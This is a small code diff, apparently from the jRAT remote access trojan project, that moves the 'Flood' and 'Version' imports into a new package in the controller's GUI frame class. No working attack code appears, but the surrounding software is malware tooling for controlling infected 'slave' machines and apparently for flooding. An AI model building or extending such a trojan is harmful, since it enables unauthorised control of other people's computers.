@@ -49,6 +49,8 @@ import pro.jrat.SampleMode;
 import pro.jrat.Slave;
 import pro.jrat.api.RATMenuItem;
 import pro.jrat.api.RATObject;
+import pro.jrat.common.Flood;
+import pro.jrat.common.Version;
 import pro.jrat.events.Event;
 import pro.jrat.events.Events;
 import pro.jrat.extensions.Plugin;
@@ -78,8 +80,6 @@ import pro.jrat.utils.FlagUtils;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Util;
 
-import com.redpois0n.common.Flood;
-import com.redpois0n.common.Version;
 
 @SuppressWarnings({ "serial" })
 public class Frame extends BaseFrame {
